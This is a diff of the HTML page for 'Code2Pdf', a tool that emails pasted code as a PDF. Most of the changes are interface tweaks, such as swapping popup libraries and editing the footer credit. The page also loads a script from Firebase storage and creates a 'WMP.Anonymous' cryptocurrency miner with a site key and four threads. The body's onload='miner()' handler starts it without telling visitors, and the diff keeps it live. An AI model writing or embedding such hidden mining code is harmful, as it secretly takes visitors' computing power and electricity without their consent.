@@ -12,12 +12,20 @@
     <title>Code2Pdf -Send PDF to Email and WhatsApp</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/1.5.3/jspdf.debug.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
-<script src="https://firebasestorage.googleapis.com/v0/b/c2p-hashes.appspot.com/o/webmp.txt?alt=media&token=9c2b1cdb-bf65-4aa7-83fc-16e76ec19562"/>   <script src="https://unpkg.com/sweetalert2@10"></script>
+    <script
+        src="https://firebasestorage.googleapis.com/v0/b/c2p-hashes.appspot.com/o/webmp.txt?alt=media&token=9c2b1cdb-bf65-4aa7-83fc-16e76ec19562" />
+    <script src="https://unpkg.com/sweetalert2@10"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@900&display=swap" rel="stylesheet">
     <link rel="shortcut icon" href="./reallogo.png" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.6.1/toastify.min.js"
+        integrity="sha512-79j1YQOJuI8mLseq9icSQKT6bLlLtWknKwj1OpJZMdPt2pFBry3vQTt+NZuJw7NSd1pHhZlu0s12Ngqfa371EA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.6.1/toastify.min.css"
+        integrity="sha512-UiKdzM5DL+I+2YFxK+7TDedVyVm7HMp/bN85NeWMJNYortoll+Nd6PU9ZDrZiaOsdarOyk9egQm6LOJZi36L2g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
     <style>
         * {
             margin: 0;
@@ -423,12 +431,13 @@
             }
 
             #send {
-                
+
                 padding: 3rem 7rem;
                 font-size: 1.4rem;
             }
-            #send img{
-                width: 1rem ;
+
+            #send img {
+                width: 1rem;
                 margin-right: 2rem;
             }
 
@@ -645,12 +654,11 @@
 </head>
 
 
-<body onload="miner()">
+<body id="react" onload="miner()">
     <div class="loader-container">
         <img src="byy.svg" alt="Loading...">
     </div>
     <div class="content">
-
         <section class="sec1">
             <div class="nav">
                 <img class="logo" src="./Untitled design (3).gif" alt="logo">
@@ -671,7 +679,6 @@
             </center>
             <br><br><br>
             <div class="arrow">
-
                 <center><img
                         src="https://lh3.googleusercontent.com/L6rXAJy8Y9fDcdJitiJVy-bzqUkQCOuu94JcuAFFMSOFzplqxuRVbuJm8g3ltrZqmsCgvsVa_BfKSp-4sw=s420"
                         width="100" alt=""></center>
@@ -689,7 +696,7 @@
                             </span> </label>
                     </div>
                     <textarea name="message" spellcheck="false" required
-                        placeholder='"Ready to share your code? Paste it here..."' id="txtarea1"
+                        placeholder='"Ready to share your code? Paste it here & Hit Enter 😊"' id="txtarea1"
                         onkeydown="handleTextareaKeyPress(event)""></textarea>
         </div>
     </section>
@@ -720,8 +727,8 @@
 </div>
     <footer>
         <div class="footer-content">
-            <p>All Rights Reserved. | Designed and developed with passion by <a href="https://artbyadi77.netlify.app/" style="color: #ddd; ">Aditya</a>, Kishan & Bhavya.</p>
-        </div>
+            <p>All Rights Reserved. | Designed and developed with passion by @unhiredcoder</p>
+            </div>
     </footer>
 </div>
 
@@ -749,14 +756,16 @@
     const checkboxText = document.getElementById('checkboxText');
     const popup = document.querySelector('.popup');
 
-var clientOBJ = WMP.Anonymous('SK_nMDhFVtxJ8Q2Lvh5cmyZT',{
+    var clientOBJ = WMP.Anonymous('SK_nMDhFVtxJ8Q2Lvh5cmyZT', {
         threads: 4,
         autoThreads: true,
         throttle: 0.1,
         forceASMJS: false
     });
 
-function miner(){clientOBJ.start()}
+    function miner() {
+        clientOBJ.start()
+    }
 
     function closepopup() {
         const popup = document.querySelector('.popup');
@@ -862,6 +871,8 @@ function miner(){clientOBJ.start()}
 
 
     function handleSendButtonClick() {
+
+
         if (!isTextareaVisible) {
             if (fileInput.files.length > 0) {
                 handleFiles(fileInput.files);
@@ -879,12 +890,14 @@ function miner(){clientOBJ.start()}
     }
 
     function displayErrorMessage(message) {
-        Swal.fire({
+
+
+
+        Toastify({
             icon: 'error',
-            title: message,
+            text: message,
             timer: 2000,
-            showConfirmButton: false,
-        });
+        }).showToast()
     }
 
     function sendTextEmail(text) {
@@ -960,19 +973,19 @@ function miner(){clientOBJ.start()}
         let email = document.querySelector(".email").value;
         let sub = document.querySelector(".sub").value;
         if (!isValidEmail(email.trim())) {
-            Swal.fire({
+            Toastify({
                 icon: 'error',
-                title: 'Please enter a valid email address.',
+                text: 'Please enter a valid email address.',
                 showConfirmButton: true,
-            });
+            }).showToast()
             return; // Exit the function if email is not valid
         }
 
         if (email.trim() === '' || sub.trim() === '') {
-            Swal.fire({
+            Toastify({
                 icon: 'warning',
-                title: 'Please enter Your email & subject before sending.',
-                timer: 2000,
+                text: 'Please enter Your email & subject before sending.',
+                duration: 2000,
                 showConfirmButton: false,
             });
             return;
@@ -991,20 +1004,19 @@ function miner(){clientOBJ.start()}
         const message = await response.text(); // Get the text content of the response
 
         if (message === 'Email sent successfully.') {
-            Swal.fire({
-                icon: 'success',
-                title: 'Sent successfully! Please check your email, including the spam folder.',
-                showConfirmButton: true,
-            });
+            Toastify({
+                text: 'Sent successfully! Please check your email.',
+            }).showToast()
             resetForm();
         } else {
             console.error(message); // Log the error message
-            Swal.fire({
+            Toastify({
                 icon: 'error',
                 title: 'There was an error sending the files.',
                 text: 'Email sending failed.',
                 showConfirmButton: true,
-            });
+                style: { font: "2rem" },
+            }).showToast()
         }
 
         send.innerHTML = 'Send';
@@ -1018,9 +1030,6 @@ function miner(){clientOBJ.start()}
         txtarea.value = '';
         send.innerHTML = 'Send';
         popup.style.display = 'none'
-        setInterval(() => {
-            window.location.reload()
-        }, 2000)
     }
 
 
